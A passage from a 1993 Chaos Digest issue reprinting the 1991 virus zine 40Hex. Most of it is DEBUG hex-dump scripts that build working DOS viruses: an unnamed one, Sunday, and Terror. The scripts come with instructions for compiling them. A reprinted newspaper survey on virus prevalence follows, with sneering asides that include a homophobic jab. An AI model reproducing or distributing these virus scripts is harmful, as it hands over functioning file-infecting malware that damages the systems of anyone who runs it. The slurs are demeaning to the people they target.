e 0AD0  5D 0B E6 FE F7 FA F5 F9 F8 E8 35 70 CC 3D 48 35
e 0AE0  71 E9 12 13 13 13 35 CA 48 BE 26 CA 69 02 9A 7B
e 0AF0  97 B4 60 C2 4E 08 A3 B7 B5 80 B0 B7 3E A2 0E B7
e 0B00  F5 85 7F 3D 60 37 74 07 B6 7B 97 02 88 7B 97 0E
e 0B10  B4 8B 7B 97 C4 00 3D 4C 35 71 EB 1D 25 02 F6 0F
e 0B20  B2 B6 0C B6 B7 7B 97 02 F6 3D 41 35 70 4A 37 B2
e 0B30  B6 B7 0F B4 B6 3D 60 7B 97 3D B2 9B BE B7 37 70
e 0B40  84 49 E0 3F B2 02 F6 0F B4 B6 3D 60 7B 97 0E B4
e 0B50  F4 85 7F 85 64 7B 97 5E 2B 4B E8 37 70 66 B6 3D
e 0B60  AA 0E B7 E1 35 70 4C 3D BA 35 70 B4 3D A2 7B 97
e 0B70  02 88 7B 97 0E B7 F5 84 5B 35 70 4B 3C BA 3D 60
e 0B80  35 74 1C 7B 97 5F 4A 48 5D DB 26 B0 98 70 B0 B6
e 0B90  B7 B6 85 6D 3A 7E F5 38 75 8D 75 C2 B9 08 B6 B7
e 0BA0  3D 48 0F B2 B6 45 10 C3 5B 5D FD 26 B1 98 71 B0
e 0BB0  BE B7 16 A2 98 71 B0 A6 B7 B7 B6 08 E5 B2 B5 80
e 0BC0  B0 B7 09 A4 B7 0F A4 B7 45 12 0E BE 83 7B 97 98
e 0BD0  3F A8 B2 B7 98 3A B0 B0 B7 0E BE 93 0C A4 B7 7B
e 0BE0  97 B0 17 9A B6 38 76 02 FF 7B 97 B1 0E B6 87 0C
e 0BF0  9C B6 7B 97 7B 96 B1 02 8D 0C 21 B7 B5 A0 B0 B7
e 0C00  7B 97 02 8D 35 74 08 7B 97 3D 44 35 70 40 09 B6
e 0C10  B7 0F BE B6 45 12 09 B6 B7 49 51 E6 E5 E7 E4 E0
e 0C20  A8 B0 2A 98 49 B8 BE B7 C3 FB 98 71 B0 BE B7 26
e 0C30  B7 B8 A9 B8 B1 08 CD B7 98 3D B8 A6 B7 84 52 1A
e 0C40  B5 46 54 4D 1A 31 43 85 7F 3C 7E 0E B6 A5 0D C6
e 0C50  B6 85 64 7B A6 98 49 B0 A6 B7 98 35 88 A6 B7 B1
e 0C60  C3 B1 98 71 B0 A6 B7 B7 B6 0F 86 B6 E7 0F 49 49
e 0C70  54 48 EF 54 41 31 43 2B B1 A9 E8 EC EF ED EE 98
e 0C80  49 98 B2 B7 B6 B9 F4 D9 D4 96 E4 D9 C5 C5 96 DA
e 0C90  DF C0 D3 C5 97 A3 F4 D9 D4 96 E4 D9 C5 C5 96 DF
e 0CA0  C5 96 C1 D7 C2 D5 DE DF D8 D1 97 A0 FB D7 CF D4
e 0CB0  D3 96 DE D3 96 DA DF C0 D3 C5 96 DE D3 C4 D3 98
e 0CC0  98 98 AC E1 DE D7 C2 96 D7 96 DE D7 C6 C6 CF 96
e 0CD0  DA DF C2 C2 DA D3 96 D5 DA D9 C3 D2 97 90 FB D7
e 0CE0  CF D4 D3 96 DE D3 96 DE D7 C5 96 D7 96 D8 D3 DF
e 0CF0  D1 DE D4 D9 C3 C4 96 C4 DF D1 DE C2 96 DE D3 C4
e 0D00  D3 98 98 98 9E EF D9 C3 96 D5 D7 D8 96 DB D7 DD
e 0D10  D3 96 C3 C6 96 C5 C2 D9 C4 DF D3 C5 96 D7 C5 96
e 0D20  CF D9 C3 96 D1 D9 96 D7 DA D9 D8 D1 98 1A 1A 1A
rcx
C2D
w
q
----------------------------------------------------------------------------

The virus itself is only 1125 bytes, this file is 3125 to account for an
infected file.

Scan 85 detects it as the [Beta] virus, but strain-b will be out soon.

+++++

40Hex Issue 4                                            December 1991


                             The Sunday Virus

        According to Patty Hoffman, the Sunday virus is based on the
Jerusalem viruses, because the codes for both viruses are similar.
Sunday infects COM, EXE, and OVL files, when they are executed, and it
stays resident in memory.  It was circulated around the Seattle,
Washington area in 1989, and is quite common.  Sunday can be picked up
by almost every scanner out there.  The SCAN ID code for this virus
is "CD 21 80 FC 04 75 10" in lines 01E0 and 01F0.
        This version of Sunday doesn't seem to print any messages on
the screen, however, some versions do, every Sunday.  This virus
spreads rapidly, and replicates quite well.


      To create SUNDAY.COM, cut out the following code, and name the
resulting file sunday.txt.  Then, use this command:  DEBUG < SUNDAY.TXT

                                                       --DecimatoR

----------------------------------------------------------------------------
n sunday.com
e 0100  E9 92 00 59 57 C8 F7 E1 EE E7 00 01 4C 1E 00 00
e 0110  00 02 00 AB 00 0C 13 16 17 C7 02 BF 05 3A 1E 63
e 0120  79 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 06
e 0130  5F BD 1D 80 00 00 00 80 00 BD 1D 5C 00 BD 1D 6C
e 0140  00 BD 1D 00 0A 95 22 29 00 00 00 00 F0 02 00 4D
e 0150  5A 87 01 14 01 ED 05 80 01 23 0B FF FF 8C 20 C0
e 0160  06 89 19 C6 00 8C 20 1E 00 00 00 00 00 00 00 00
e 0170  05 00 20 00 29 15 01 79 00 02 10 00 C0 20 02 00
e 0180  54 61 28 99 43 4F 4D 4D 41 4E 44 2E 43 4F 4D 01
e 0190  00 00 00 00 00 FC 06 B8 00 00 8E C0 26 A1 84 00
e 01A0  07 3D 4C 02 75 10 B4 DD BF 00 01 BE C2 06 03 F7
e 01B0  2E 8B 4D 11 CD 21 8C C8 05 10 00 8E D0 BC C0 06
e 01C0  50 B8 C6 00 50 CB FC 06 2E 8C 06 31 00 2E 8C 06
e 01D0  39 00 2E 8C 06 3D 00 2E 8C 06 41 00 8C C0 05 10
e 01E0  00 2E 01 06 49 00 2E 01 06 45 00 B4 FF CD 21 80
e 01F0  FC 04 75 10 07 2E 8E 16 45 00 2E 8B 26 43 00 2E
e 0200  FF 2E 47 00 33 C0 8E C0 BB FC 03 26 8B 07 2E A3
e 0210  4B 00 26 8A 47 02 2E A2 4D 00 26 C7 07 F3 A5 26
e 0220  C6 47 02 CB 58 05 10 00 8E C0 0E 1F B9 C2 06 D1
e 0230  E9 33 F6 8B FE 06 B8 3E 01 50 FF 2E 59 06 8C C8
e 0240  8E D0 BC C0 06 33 C0 8E D8 2E A1 4B 00 89 07 2E
e 0250  A0 4D 00 88 47 02 8B DC B1 04 D3 EB 83 C3 20 83
e 0260  E3 F0 2E 89 1E 33 00 B4 4A 2E 8E 06 31 00 CD 21
e 0270  B8 21 35 CD 21 2E 89 1E 17 00 2E 8C 06 19 00 0E
e 0280  1F BA 4C 02 B8 21 25 CD 21 8E 06 31 00 26 8E 06
e 0290  2C 00 33 FF B9 FF 7F 32 C0 F2 AE 26 38 05 E0 F9
e 02A0  8B D7 83 C2 03 B8 00 4B 06 1F 0E 07 BB 35 00 1E
e 02B0  06 50 53 51 52 B4 0F CD 10 3C 07 74 07 2E C7 06
e 02C0  4A 02 00 B8 B8 08 35 CD 21 2E 89 1E 13 00 2E 8C
e 02D0  06 15 00 0E 1F C7 06 1F 00 E0 79 B8 08 25 BA 0A
e 02E0  02 CD 21 5A 59 5B 58 07 1F 9C 2E FF 1E 17 00 1E
e 02F0  07 B4 49 CD 21 B4 4D CD 21 B4 31 BA C2 06 B1 04
e 0300  D3 EA 83 C2 10 CD 21 32 C0 CF 2E 83 3E 1F 00 00
e 0310  75 22 1E 06 56 57 50 8D 36 3E 02 0E 1F A1 4A 02
e 0320  8E C0 BF 00 00 FC A5 A5 A5 A5 A5 A5 58 5F 5E 07
e 0330  1F EB 06 90 2E FF 0E 1F 00 2E FF 2E 13 00 48 F0
e 0340  61 F0 21 F0 48 F0 61 F0 21 F0 00 B8 9C 80 FC FF
e 0350  75 05 B8 00 04 9D CF 80 FC DD 74 0E 3D 00 4B 75
e 0360  03 EB 21 90 9D 2E FF 2E 17 00 58 58 B8 00 01 2E
e 0370  A3 0A 00 58 2E A3 0C 00 F3 A4 9D 2E A1 0F 00 2E
e 0380  FF 2E 0A 00 2E C7 06 70 00 FF FF 2E C7 06 8F 00
e 0390  00 00 2E 89 16 80 00 2E 8C 1E 82 00 50 53 51 52
e 03A0  56 57 1E 06 FC 8B FA 32 D2 80 7D 01 3A 75 05 8A
e 03B0  15 80 E2 1F B4 36 CD 21 3D FF FF 75 03 E9 0F 03
e 03C0  F7 E3 F7 E1 0B D2 75 05 3D C2 06 72 F0 2E 8B 16
e 03D0  80 00 1E 07 32 C0 B9 41 00 F2 AE 2E 8B 36 80 00
e 03E0  8A 04 0A C0 74 0E 3C 61 72 07 3C 7A 77 03 80 2C
e 03F0  20 46 EB EC 2E 89 36 57 06 B9 0B 00 2B F1 BF 84
e 0400  00 0E 07 B9 0B 00 F3 A6 75 03 E9 C2 02 2E C6 06
e 0410  56 06 00 90 2E 8B 36 57 06 8D 3E 55 06 4F 4E 26
e 0420  8A 05 34 BB 3C 00 74 0D 3A 04 74 F1 2E C6 06 56
e 0430  06 01 90 EB E8 2E 80 3E 56 06 00 74 16 4F 26 80
e 0440  3D FF 74 2B 47 2E 8B 36 57 06 2E C6 06 56 06 00
e 0450  90 EB CA 07 1F 5F 5E 5A 59 5B 58 33 C9 B8 01 43
e 0460  CD 21 B4 41 CD 21 B8 00 4B 9D 2E FF 2E 17 00 B8
e 0470  00 43 CD 21 72 05 2E 89 0E 72 00 72 25 32 C0 2E
e 0480  A2 4E 00 1E 07 8B FA B9 41 00 F2 AE 80 7D FE 4D
e 0490  74 0B 80 7D FE 6D 74 05 2E FE 06 4E 00 B8 00 3D
e 04A0  CD 21 72 7C 2E A3 70 00 8B D8 B8 02 42 B9 FF FF
e 04B0  BA FB FF CD 21 72 EB 05 05 00 2E A3 11 00 B9 05
e 04C0  00 BA 6B 00 8C C8 8E D8 8E C0 B4 3F CD 21 8B FA
e 04D0  BE 05 00 F3 A6 74 22 B0 00 B9 00 00 BA 00 00 B4
e 04E0  42 CD 21 8D 16 DD 05 B9 14 00 B4 3F CD 21 81 3E
e 04F0  EF 05 89 19 75 0A E9 91 01 B4 3E CD 21 E9 CF 01
e 0500  B8 24 35 CD 21 89 1E 1B 00 8C 06 1D 00 BA 07 02
e 0510  B8 24 25 CD 21 C5 16 80 00 33 C9 B8 01 43 CD 21
e 0520  72 3B 2E 8B 1E 70 00 B4 3E CD 21 2E C7 06 70 00
e 0530  FF FF B8 02 3D CD 21 72 24 2E A3 70 00 8C C8 8E
e 0540  D8 8E C0 8B 1E 70 00 B8 00 57 CD 21 89 16 74 00
e 0550  89 0E 76 00 B8 00 42 33 C9 8B D1 CD 21 72 3E 80
e 0560  3E 4E 00 00 74 04 EB 5B 90 90 BB 00 10 B4 48 CD
e 0570  21 73 0B B4 3E 8B 1E 70 00 CD 21 E9 51 01 FF 06
e 0580  8F 00 8E C0 33 F6 8B FE B9 C2 06 F3 A4 8B D7 8B
e 0590  0E 11 00 8B 1E 70 00 06 1F B4 3F CD 21 72 1F 03
e 05A0  F9 33 C9 8B D1 B8 00 42 CD 21 BE 05 00 B9 05 00
e 05B0  1E 0E 1F F3 A4 1F 8B CF 33 D2 B4 40 CD 21 72 0D
e 05C0  E9 C7 00 B9 1C 00 BA 4F 00 B4 3F CD 21 72 4A C7
e 05D0  06 61 00 89 19 A1 5D 00 A3 45 00 A1 5F 00 A3 43
e 05E0  00 A1 63 00 A3 47 00 A1 65 00 A3 49 00 A1 53 00
e 05F0  83 3E 51 00 00 74 01 48 F7 26 78 00 03 06 51 00
e 0600  83 D2 00 05 0F 00 83 D2 00 25 F0 FF A3 7C 00 89
e 0610  16 7E 00 05 C7 06 83 D2 00 72 3A F7 36 78 00 0B
e 0620  D2 74 01 40 A3 53 00 89 16 51 00 A1 7C 00 8B 16
e 0630  7E 00 F7 36 7A 00 2B 06 57 00 A3 65 00 C7 06 63
e 0640  00 C6 00 A3 5D 00 C7 06 5F 00 C0 06 33 C9 8B D1
e 0650  B8 00 42 CD 21 72 0A B9 1C 00 BA 4F 00 B4 40 CD
e 0660  21 72 11 3B C1 75 23 8B 16 7C 00 8B 0E 7E 00 B8
e 0670  00 42 CD 21 72 14 33 D2 B9 C2 06 B4 40 CD 21 B9
e 0680  05 00 8D 16 05 00 B4 40 CD 21 2E 83 3E 8F 00 00
e 0690  74 04 B4 49 CD 21 2E 83 3E 70 00 FF 74 31 2E 8B
e 06A0  1E 70 00 2E 8B 16 74 00 2E 8B 0E 76 00 B8 01 57
e 06B0  CD 21 B4 3E CD 21 0E 1F C5 16 80 00 2E 8B 0E 72
e 06C0  00 B8 01 43 CD 21 8D 16 1B 00 B8 24 25 CD 21 07
e 06D0  1F 5F 5E 5A 59 5B 58 9D 2E FF 2E 17 00 CD 20 BA
e 06E0  00 11 01 ED 05 80 01 23 0B FF FF 95 22 00 0A D5
e 06F0  44 00 00 00 00 00 00 00 00 00 00 FF BB F9 FA E8
e 0700  F2 F8 FA 95 FE E3 FE BB F8 EE E9 FE 95 FE E3 FE
e 0710  BB F7 F4 EF EE E8 95 F8 F4 F6 BB F8 EC F2 95 FE
e 0720  E3 FE BB FE EF F9 FA E8 F2 F8 95 FE E3 FE BB F9
e 0730  FA E8 F2 F8 FA 95 F8 F4 F6 BB 8A 89 88 95 FE E3
e 0740  FE BB FF F9 FA E8 FE 95 FE E3 FE BB F9 FA E8 F2
e 0750  F8 95 F8 F4 F6 BB 01 68 61 FC 03 00 00 00 00 00
e 0760  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0770  00 00 00 00 00 00 00 00 8C 0D 01 00 20 1C C3 28
e 0780  8C 0D 01 00 FE 26 2E 00 8C 0D 04 7F A7 20 6C 15
e 0790  24 25 05 00 20 00 C6 08 60 C1 57 18 08 25 AB 00
e 07A0  44 7F 0A 02 C2 06 57 18 BD 1D 47 01 04 7F 7C 00
e 07B0  C2 06 B6 00 1C 09 AF 1D 3D 1C 07 02 BD 1D 02 02
e 07C0  4D 3A CD 20 C8 F7 E1 EE E7 1A 1A 1A 1A 1A 1A 1A

rcx
7CF
w
q

------------------------------

End of Chaos Digest #1.41
************************************

Chaos Digest               Lundi 31 Mai 1993        Volume 1 : Numero 42
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.42 (31 Mai 1993)
File 1--40H VMag Issue 1 Volume 4 #004-008 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 4 #004-008 (reprint)


40Hex Issue 4                                            December 1991

                                 Terror
                                 ++++++

   Duh, just as I was about to relase this issue I found that I forgot
   to make a artical 4.  So here it is.

---------------------------------------------------------------------------
n terror.com
e 0100  50 8C C8 01 06 0B 01 58 EA 00 01 40 00 90 90 90
e 0110  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0120  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0130  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0140  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0150  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0160  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0170  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0180  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0190  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 01A0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 01B0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 01C0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 01D0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 01E0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 01F0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0200  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0210  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0220  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0230  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0240  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0250  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0260  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0270  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0280  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0290  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 02A0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 02B0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 02C0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 02D0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 02E0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 02F0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0300  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0310  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0320  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0330  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0340  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0350  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0360  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0370  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0380  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0390  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 03A0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 03B0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 03C0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 03D0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 03E0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 03F0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0400  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0410  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0420  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0430  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0440  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0450  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0460  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0470  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0480  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0490  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 04A0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 04B0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 04C0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 04D0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 04E0  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 04F0  90 90 90 90 90 90 90 90 90 90 90 B8 00 4C CD 21
e 0500  EB 44 E4 12 AB 09 8D 13 D0 17 60 14 7A 0F E9 F8
e 0510  03 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0520  90 90 90 90 90 90 44 3A 5C 43 4F 4D 4D 41 4E 44
e 0530  2E 43 4F 4D 00 2E 81 3E 0E 01 5A 4D 74 07 2E 81
e 0540  3E 0E 01 4D 5A C3 2E 8C 1E 41 05 50 B8 59 EC CD
e 0550  21 3B E8 75 3E 0E 1F 58 2E 8E 06 41 05 E8 D5 FF
e 0560  74 10 B9 0D 00 BE 0E 01 06 BF 00 01 57 F3 A4 06
e 0570  1F CB 8C C6 83 C6 10 2E 01 36 24 01 2E 03 36 1C
e 0580  01 2E 8B 3E 1E 01 06 1F FA 8E D6 8B E7 FB 2E FF
e 0590  2E 22 01 B4 30 CD 21 BB 02 01 3D 03 0A 75 12 B8
e 05A0  70 00 BB 43 0D 8E C0 26 80 3F 2E 75 2A 8B C3 EB
e 05B0  2A 83 C3 04 3D 03 14 74 1E 83 C3 04 3D 03 1E 74
e 05C0  16 B8 13 35 CD 21 2E 89 1E 27 05 2E 8C 06 29 05
e 05D0  B8 21 35 8B D3 EB 16 2E 8B 47 02 2E 8B 17 2E A3
e 05E0  27 05 2E C7 06 29 05 70 00 B4 34 CD 21 06 1F B8
e 05F0  EC 25 CD 21 2E A1 41 05 8E C0 48 8E D8 8B 1E 03
e 0600  00 83 EB 65 03 C3 26 A3 02 00 B4 4A CD EC BB 64
e 0610  00 B4 48 CD EC 2D 10 00 8E C0 C6 06 00 00 5A 0E
e 0620  1F BE 00 01 8B FE B9 43 04 90 F3 A4 BF 32 02 06
e 0630  57 CB 26 C7 06 F1 00 70 00 B8 21 35 CD EC 2E 89
e 0640  1E 87 02 2E 8C 06 89 02 B4 25 BA 63 02 0E 1F CD
e 0650  EC 0E 07 BF 43 05 B9 19 00 B0 00 F3 AA E9 F7 FE
e 0660  8B E8 CF 3D 59 EC 74 F8 3D 00 4B 74 1E 80 FC 3D
e 0670  74 21 80 FC 3E 74 44 80 FC 11 75 0A 57 8B FA 80
e 0680  7D 06 08 74 77 5F EA 5C 06 1E 29 E8 91 00 EB F6
e 0690  59 EB F3 51 E8 27 02 72 F7 83 F9 20 59 75 E7 B0
e 06A0  02 9C 2E FF 1E 87 02 72 0F 50 53 8B D8 2E A0 5C
e 06B0  05 2E 88 87 43 05 5B 58 CA 02 00 2E 80 BF 43 05
e 06C0  00 74 C3 50 2E 8A 87 43 05 2E A2 5C 05 2E C6 87
e 06D0  43 05 00 B4 45 CD EC 2E A3 41 05 58 72 A8 9C 2E
e 06E0  FF 1E 87 02 72 D2 53 2E 8B 1E 41 05 1E E8 5F 00
e 06F0  E8 92 00 E8 A6 01 1F 5B F8 CA 02 00 50 52 1E 8A
e 0700  45 07 BA 26 01 0A C0 74 08 04 40 2E A2 26 01 EB
e 0710  03 83 C2 02 0E 1F E8 06 00 1F 5A 58 E9 66 FF 50
e 0720  53 51 E8 99 01 72 24 51 1E E8 23 00 1F B8 01 43
e 0730  33 C9 CD EC 72 07 B8 02 3D CD EC 8B D8 59 72 08
e 0740  E8 42 00 B8 01 43 CD EC E8 51 01 59 5B 58 C3 50
e 0750  52 53 06 B8 13 35 CD EC 2E 89 1E 22 05 2E 8C 06
e 0760  24 05 B0 24 CD EC 2E 89 1E 3D 05 2E 8C 06 3F 05
e 0770  07 5B 0E 1F BA 19 05 B4 25 CD EC BA 1C 05 B0 13
e 0780  CD EC 5A 58 C3 50 51 52 56 57 1E BF 0E 01 B9 FF
e 0790  FF BA FA FF B8 02 42 CD EC B4 3F B9 06 00 0E 1F
e 07A0  8B D7 CD EC 72 1B 2E 81 3D 54 65 74 14 33 C9 33
e 07B0  D2 B8 00 42 CD EC B4 3F B9 18 00 8B D7 CD EC 73
e 07C0  03 E9 C4 00 33 C9 33 D2 2E 80 3E 5C 05 02 75 0B
e 07D0  81 7D 01 00 40 77 EA 49 BA 83 FB B8 02 42 CD EC
e 07E0  A9 0F 00 74 0F 8B CA 8B D0 83 C2 10 80 E2 F0 B8
e 07F0  00 42 EB EA E8 3E FD 74 11 0B D2 75 C4 3D 00 04
e 0800  73 03 E9 83 00 3D 00 FA 77 7E B1 04 D3 E8 8B F0
e 0810  B1 0C D3 E2 03 F2 B4 40 BA 00 01 B9 3D 04 90 CD
e 0820  EC 72 65 E8 0F FD 75 3C 83 EE 10 2E 2B 75 08 2E
e 0830  C7 45 14 00 01 2E 89 75 16 2E C7 45 10 00 04 83
e 0840  C6 44 90 2E 89 75 0E B8 02 42 33 C9 33 D2 CD EC
e 0850  B9 00 02 F7 F1 0B D2 74 01 40 2E 89 55 02 2E 89
e 0860  45 04 EB 12 56 57 06 0E 07 BE 2B 05 B9 0B 00 F3
e 0870  A4 07 5F 8F 45 0B B8 00 42 33 C9 33 D2 CD EC B4
e 0880  40 B9 18 00 8B D7 CD EC B8 00 57 CD EC B0 01 CD
e 0890  EC B4 3E CD EC 1F 5F 5E 5A 59 58 C3 50 52 1E B8
e 08A0  13 25 2E 8B 16 22 05 2E 8E 1E 24 05 CD EC B0 24
e 08B0  2E 8B 16 3D 05 2E 8E 1E 3F 05 1F 5A 58 C3 50 06
e 08C0  57 53 8B FA 1E 07 B0 00 B9 40 00 F2 AE 8B 45 FD
e 08D0  8B 4D FB 25 5F 5F 80 E5 5F 3D 4F 4D 75 09 81 F9
e 08E0  2E 43 74 0E F9 EB 2D 3D 58 45 75 F8 81 F9 2E 45
e 08F0  75 F2 B9 07 00 BB FF FF 43 8A 41 F4 24 5F 2E 3A
e 0900  87 29 01 E1 F3 B0 01 75 02 B0 02 2E A2 5C 05 B8
e 0910  00 43 CD EC 5B 5F 07 58 C3 B0 03 CF 80 FC 03 74
e 0920  05 EA C8 0E 1E 29 EA 7A 0F 70 00 50 8C C8 01 06
e 0930  0B 01 58 EA 00 01 20 54 65 72 72 6F 72 1A 1A 1A
rcx
083d
w
q

+++++

40Hex Issue 4                                            December 1991

"No feelings of what I left behind, no guilt for the victims of my crime.  No
compassion, just a burning deep inside.  No pain... I'm here just to die... "
- Sub Zero


This artical is from the 11/26/91 morning final of the San Jose Mercury News

**text written like this is my comments**

                 SURVEY DEFLATES COMPUTER-VIRUS DANGERS

But safeguards are few as cases proliferate.

   Computer viruses, those nasty bits of distructive programming unleashed
by deviant hackers, are multiplying at a startling rate - but haven't proved
nearly as troublesome as once feared and aren't scaring users enough to take
even simple safeguards.

   Dataquest Inc. a marker research firm in San Jose released a ground-
breaking 150-page survey Monday showing that almost two-thirds of business
and government organizatons with more than 300 personal computers has
encountered a viurs at least once this year.  Yet only 15 percent of them
has installed anti-virus software.

   What's more, Dataquest found the virus encounters more than doubled
in each of the first three quarters of 1991. ****

   The National Computer Security Association of Washington D.C., which
represents 1,000 developers of anti-virus software, hired Dataquest to
conduct what is apparently the first study of virus proliferation by a
reseacher not directly employed by an anti-virus software company.

   Computer viruses hide themselves in legitamate files, jumping from
machine to machine.  Triggered either at random or on a set date, such
as Friday the 13th, the most destructive viruses gobble up programs and
data in their host computers. **gobble???**

   Robert Morris, then a student at Cornell University, unleashed a
the biggest virus to date in November 1988 **please** when a program he
intended to queitly slip onto a network call Internet went out of
control and temporally shut down 6,000 computers at universitys and
government reaserch labrotorys nationwide.  In the wake of the Internet
case, there were dire predictions of future virus attacks the could
bring the entire economy grinding to a halt.

   But there haven't been any major virus outbreaks since then and, it
turnded out, the Internet virus **Internet worm, damn it!!!** did little
permanent damage.

   What's more, most viruses are relitavely mild - more like a case of
sniffles the double pnemonia.  Typically, these mild viruses take up
space in the computers memory and slow down operations, but don't
destroy data. ** :) :( **

   "Many viruses are very innocuous," said Shella Cotter, director of
software consulting for Dataquest. "You find them, you identify them and
you get rid of them."

   "Many of the viruses I've heard about have not been big problems,"
added Jay BloomBecker ** tell me he aint gay **, director of the
National Center for Computer Crime Data in Santa Cruz.  "But it's
significant enough that if you're not paying attention to it, you
security is probably inadeqaute."

   Anti-virus software sold over the counter automatcally plucks out
the most of the roughly, 1,000 viruses identifey thoughout the world.
Occasoinally however, killer viruses can take over an entire computer
system and threaten a buisness with massive losses of crucial information.

   Dataquest talked to 600 orginazations during October and dicovered
that 63 percent had encountered at least one virussince the beginning of
the year.  Of these reporting and encounter, 62 percent claimed "a
definite loss of productivity," although the $70,000 study did not
tabulate the total cost.

   In the survey group, 9 percent reported a "virus disaster," defined
as a single incedent affecting 25 or more personal computers or
